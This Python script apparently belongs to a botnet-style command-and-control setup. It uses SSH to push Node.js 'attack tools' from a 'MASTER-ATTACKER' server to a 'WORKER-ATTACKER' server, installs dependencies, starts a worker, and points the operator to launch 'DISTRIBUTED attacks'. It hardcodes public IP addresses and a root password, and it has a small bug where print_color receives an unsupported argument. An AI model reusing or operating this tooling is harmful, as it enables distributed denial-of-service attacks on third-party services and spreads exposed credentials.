#!/usr/bin/env python3
"""
Auto Deploy Tool - Hanya deploy ke WORKER (Server 2)
Men-deploy tools dari Master (Server 1) ke Worker (Server 2)
Server 1 tidak di-deploy karena sudah siap dengan tools-nya
"""

import json
import paramiko
import os
import time
import sys

def print_color(text, color):
    """Print dengan warna"""
    colors = {
        'red': '\033[91m',
        'green': '\033[92m',
        'yellow': '\033[93m',
        'blue': '\033[94m',
        'purple': '\033[95m',
        'cyan': '\033[96m',
        'end': '\033[0m'
    }
    print(f"{colors.get(color, '')}{text}{colors['end']}")

def load_config():
    """Load konfigurasi dari file"""
    config_path = 'config.json'
    if not os.path.exists(config_path):
        print_color("[!] config.json tidak ditemukan!", 'red')
        # Buat config template
        template = {
            "server1": {
                "name": "MASTER-ATTACKER",
                "ip": "209.38.31.82",
                "port": 22,
                "username": "root",
                "password": "WYIIOFFC#4VCPU16GBAMD",
                "max_bots": 10000,
                "is_master": True,
                "attack_capable": True
            },
            "server2": {
                "name": "WORKER-ATTACKER",
                "ip": "134.199.174.157",
                "port": 22,
                "username": "root",
                "password": "WYIIOFFC#4VCPU16GBAMD",
                "max_bots": 10000,
                "is_master": False,
                "attack_capable": True
            },
            "security": {
                "api_key": "ruiix-c2",
                "admin_only": True
            },
            "attack": {
                "default_duration": 60,
                "default_threads": 100,
                "max_requests": 1000000,
                "distribute_load": True
            }
        }
        with open('config.json', 'w') as f:
            json.dump(template, f, indent=4)
        print_color("[✓] config.json template telah dibuat. Silakan edit password!", 'green')
        print_color("\n[!] Setelah mengedit password, jalankan ulang script ini.", 'yellow')
        sys.exit(0)
    
    try:
        with open(config_path, 'r') as f:
            return json.load(f)
    except json.JSONDecodeError as e:
        print_color(f"[!] Error parsing config.json: {e}", 'red')
        sys.exit(1)

def check_ssh_connection(ip, port, username, password):
    """Cek koneksi SSH ke worker"""
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=port, username=username, password=password, timeout=5)
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        print_color(f"  SSH Authentication Failed - Cek password", 'red')
        return False
    except Exception as e:
        print_color(f"  SSH Connection Failed: {e}", 'red')
        return False

def check_local_tools():
    """Cek apakah tools lokal sudah siap"""
    tools_dir = 'tools'
    required_tools = ['worker.py', 'H2.js', 'RAW.js', 'TO.js', 'STORMX.js', 'proxy.js']
    missing_tools = []
    
    print_color("\n[•] Checking local tools...", 'cyan')
    
    if not os.path.exists(tools_dir):
        print_color(f"  [✗] Folder '{tools_dir}' tidak ditemukan!", 'red')
        return False
    
    for tool in required_tools:
        tool_path = os.path.join(tools_dir, tool)
        if os.path.exists(tool_path):
            print_color(f"  ✓ {tool}", 'green')
        else:
            print_color(f"  ✗ {tool} (MISSING)", 'red')
            missing_tools.append(tool)
    
    if missing_tools:
        print_color(f"\n[!] Tools berikut tidak ditemukan: {', '.join(missing_tools)}", 'yellow')
        print_color("[!] Pastikan semua tools ada di folder 'tools/' sebelum deploy.", 'yellow')
        return False
    
    return True

def deploy_to_worker(server_config, master_ip, api_key):
    """Deploy ke worker server (server2)"""
    server_ip = server_config['ip']
    server_port = server_config['port']
    username = server_config['username']
    password = server_config['password']
    server_name = server_config.get('name', 'WORKER')
    max_bots = server_config.get('max_bots', 10000)
    
    print_color(f"\n[•] Deploying to WORKER ({server_name}) at {server_ip}:{server_port}...", 'cyan')
    print_color(f"  Username: {username}", 'yellow')
    
    # Cek koneksi dulu
    if not check_ssh_connection(server_ip, server_port, username, password):
        print_color(f"  [✗] Cannot connect to worker server", 'red')
        return False
    
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(server_ip, port=server_port, username=username, password=password, timeout=10)
        
        print_color("  [✓] SSH Connected successfully", 'green')
        
        # Install dependencies di worker
        print_color("\n  [•] Installing dependencies on worker...", 'yellow')
        commands = [
            "apt-get update -qq",
            "apt-get install -y python3-pip nodejs npm screen git curl -qq",
            "pip3 install flask requests psutil -q",
            "npm install -g axios http2 net --silent",
            "mkdir -p /root/c2/tools",
            "mkdir -p /root/c2/logs"
        ]
        
        for i, cmd in enumerate(commands, 1):
            print(f"    ({i}/{len(commands)}) Running: {cmd[:40]}...")
            stdin, stdout, stderr = ssh.exec_command(cmd)
            exit_status = stdout.channel.recv_exit_status()
            if exit_status == 0:
                print(f"      ✓ Done")
            else:
                print(f"      ⚠ Return code: {exit_status}")
        
        # Upload worker.py ke worker
        print_color("\n  [•] Uploading worker.py...", 'yellow')
        sftp = ssh.open_sftp()
        
        worker_path_local = 'tools/worker.py'
        worker_path_remote = '/root/c2/worker.py'
        
        if os.path.exists(worker_path_local):
            with open(worker_path_local, 'r') as f:
                worker_content = f.read()
            with sftp.open(worker_path_remote, 'w') as f:
                f.write(worker_content)
            print(f"    ✓ Uploaded worker.py ({len(worker_content)} bytes)")
        else:
            print_color(f"    [✗] worker.py not found in tools/ folder!", 'red')
        
        # Upload Node.js tools ke worker
        print_color("\n  [•] Uploading Node.js attack tools...", 'yellow')
        node_tools = ['H2.js', 'RAW.js', 'TO.js', 'STORMX.js', 'proxy.js']
        
        for tool in node_tools:
            tool_path_local = os.path.join('tools', tool)
            tool_path_remote = f'/root/c2/tools/{tool}'
            
            if os.path.exists(tool_path_local):
                with open(tool_path_local, 'r') as f:
                    tool_content = f.read()
                with sftp.open(tool_path_remote, 'w') as tf:
                    tf.write(tool_content)
                print(f"    ✓ Uploaded {tool} ({len(tool_content)} bytes)")
            else:
                print(f"    ✗ {tool} not found in tools/ folder!")
        
        sftp.close()
        
        # Buat config.json untuk worker
        print_color("\n  [•] Creating config.json for worker...", 'yellow')
        worker_config = {
            'worker_name': server_name,
            'worker_ip': server_ip,
            'worker_port': 5001,
            'master_ip': master_ip,
            'master_port': 5000,
            'api_key': api_key,
            'max_bots': max_bots
        }
        
        config_json = json.dumps(worker_config, indent=4)
        config_cmd = f"cat > /root/c2/config.json << 'EOF'\n{config_json}\nEOF"
        stdin, stdout, stderr = ssh.exec_command(config_cmd)
        print(f"    ✓ Config.json created with API Key: {api_key[:8]}...")
        
        # Buat package.json untuk Node.js di worker
        print_color("\n  [•] Creating package.json...", 'yellow')
        package_json = {
            "name": "c2-worker-tools",
            "version": "1.0.0",
            "description": "C2 Worker Attack Tools",
            "main": "worker.py",
            "dependencies": {
                "axios": "^1.6.0",
                "http2": "^3.3.7",
                "https": "^1.0.0",
                "net": "^1.0.2",
                "tls": "^1.0.1",
                "crypto": "^1.0.1"
            }
        }
        
        package_str = json.dumps(package_json, indent=2)
        package_cmd = f"cat > /root/c2/package.json << 'EOF'\n{package_str}\nEOF"
        stdin, stdout, stderr = ssh.exec_command(package_cmd)
        print(f"    ✓ package.json created")
        
        # Install Node.js dependencies di worker
        print_color("\n  [•] Installing Node.js dependencies on worker...", 'yellow')
        print(f"    Running: npm install (this may take a moment)...")
        stdin, stdout, stderr = ssh.exec_command("cd /root/c2 && npm install --silent")
        exit_status = stdout.channel.recv_exit_status()
        if exit_status == 0:
            print(f"    ✓ Node.js dependencies installed")
        else:
            print(f"    ⚠ npm install returned code: {exit_status}")
        
        # Jalankan worker di screen
        print_color("\n  [•] Starting worker process...", 'yellow')
        
        # Kill existing worker if any
        ssh.exec_command("pkill -f worker.py")
        time.sleep(1)
        
        # Start new worker
        ssh.exec_command("cd /root/c2 && screen -dmS worker python3 worker.py")
        print(f"    ✓ Worker started in screen session 'worker'")
        
        # Cek apakah worker berjalan
        time.sleep(2)
        stdin, stdout, stderr = ssh.exec_command("ps aux | grep worker.py | grep -v grep")
        worker_check = stdout.read().decode().strip()
        
        if worker_check:
            print_color(f"    [✓] Worker is running: {worker_check[:60]}", 'green')
        else:
            print_color(f"    [⚠] Worker might not be running - check manually", 'yellow')
        
        # Cek tools di worker
        stdin, stdout, stderr = ssh.exec_command("ls -la /root/c2/tools/ | wc -l")
        tool_count = stdout.read().decode().strip()
        print_color(f"    [✓] Tools in worker: {tool_count} files", 'green')
        
        ssh.close()
        print_color(f"\n  [✓] Deployment to WORKER complete!", 'green')
        return True
        
    except paramiko.AuthenticationException:
        print_color(f"  [✗] Authentication failed - wrong password?", 'red')
        return False
    except Exception as e:
        print_color(f"  [✗] Error during deployment: {e}", 'red')
        return False

def test_worker_connection(server_config):
    """Test koneksi ke worker"""
    print_color(f"\n[•] Testing connection to WORKER {server_config['ip']}...", 'cyan')
    return check_ssh_connection(
        server_config['ip'],
        server_config['port'],
        server_config['username'],
        server_config['password']
    )

def main():
    """Main function"""
    print_color("""
    ╔════════════════════════════════════════════════════════════╗
    ║         AUTO DEPLOY TOOL - DEPLOY TO WORKER ONLY           ║
    ║                                                             ║
    ║     Server 1 (Master) : TIDAK DI-DEPLOY (sudah siap)       ║
    ║     Server 2 (Worker) : DI-DEPLOY (tools & worker)         ║
    ║                    Version 3.0                              ║
    ╚════════════════════════════════════════════════════════════╝
    """, 'cyan')
    
    # Load config
    config = load_config()
    
    server1 = config['server1']
    server2 = config['server2']
    api_key = config['security']['api_key']
    
    print_color("\n[•] Configuration:", 'purple')
    print_color(f"  SERVER 1 (MASTER) : {server1['ip']} (this machine - NOT DEPLOYED)", 'green')
    print_color(f"  ├─ Attack Capable : {'Yes' if server1.get('attack_capable', True) else 'No'}", 'green')
    print_color(f"  └─ Tools Status   : Check manually", 'green')
    
    print_color(f"\n  SERVER 2 (WORKER) : {server2['ip']}:{server2['port']}", 'yellow')
    print_color(f"  ├─ Username       : {server2['username']}", 'yellow')
    print_color(f"  ├─ Max Bots       : {server2['max_bots']}", 'yellow')
    print_color(f"  └─ Attack Capable : {'Yes' if server2.get('attack_capable', True) else 'No'}", 'yellow')
    
    print_color(f"\n  SECURITY:", 'purple')
    print_color(f"  └─ API Key        : {api_key[:8]}... (keep this secret!)", 'yellow')
    
    # Cek tools lokal
    if not check_local_tools():
        print_color("\n[!] Local tools check failed. Perbaiki sebelum deploy.", 'red')
        sys.exit(1)
    
    # Test koneksi ke worker
    if not test_worker_connection(server2):
        print_color("\n[!] Cannot connect to WORKER. Periksa:", 'red')
        print_color("  - IP Address是否正确", 'yellow')
        print_color("  - Port 22是否开放", 'yellow')
        print_color("  - Username/password是否正确", 'yellow')
        print_color("  - SSH service是否运行", 'yellow')
        sys.exit(1)
    
    # Konfirmasi
    print_color("\n[?] This will deploy to WORKER only. Continue? (y/n): ", 'purple', end='')
    confirm = input().lower()
    
    if confirm != 'y':
        print_color("[!] Deployment cancelled", 'yellow')
        sys.exit(0)
    
    # Deploy hanya ke server2 (worker)
    start_time = time.time()
    success = deploy_to_worker(server2, server1['ip'], api_key)
    elapsed_time = time.time() - start_time
    
    # Summary
    print_color("\n" + "="*60, 'cyan')
    print_color("DEPLOYMENT SUMMARY:", 'purple')
    print_color(f"WORKER ({server2['ip']}): {'[✓] SUCCESS' if success else '[✗] FAILED'}", 'green' if success else 'red')
    print_color(f"Time elapsed: {elapsed_time:.1f} seconds", 'cyan')
    
    if success:
        print_color("\n[✓] Worker deployment successful!", 'green')
        print_color("\n[•] Next steps:", 'cyan')
        print_color("  1. On MASTER, run: python3 index.py", 'yellow')
        print_color("  2. Use command 'status' to check worker", 'yellow')
        print_color("  3. Use command 'proxy' to update proxies (akan scrape & upload ke worker)", 'yellow')
        print_color("  4. Use command 'attack' to start DISTRIBUTED attacks (Master + Worker)", 'yellow')
        
        print_color("\n[•] Worker information:", 'cyan')
        print_color(f"  IP Address : {server2['ip']}", 'yellow')
        print_color(f"  API Port   : 5001", 'yellow')
        print_color(f"  API Key    : {api_key[:8]}...", 'yellow')
        print_color(f"  Tools path : /root/c2/tools/", 'yellow')
        print_color(f"  Worker PID : Run 'ps aux | grep worker.py' on worker", 'yellow')
        
        print_color("\n[•] To test worker API:", 'cyan')
        print_color(f"  curl -X GET http://{server2['ip']}:5001/status -H \"X-API-Key: {api_key}\"", 'yellow')
        
    else:
        print_color("\n[✗] Deployment failed!", 'red')
        print_color("Please check:", 'yellow')
        print_color("  - Password in config.json is correct", 'yellow')
        print_color("  - SSH service is running on worker (port 22)", 'yellow')
        print_color("  - Worker has internet access for apt-get & npm", 'yellow')
        print_color("  - Run manually: ssh root@{server2['ip']} to test connection", 'yellow')

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print_color("\n\n[!] Deployment interrupted by user", 'yellow')
        sys.exit(0)
    except Exception as e:
        print_color(f"\n[!] Unexpected error: {e}", 'red')
        import traceback
        traceback.print_exc()
        sys.exit(1)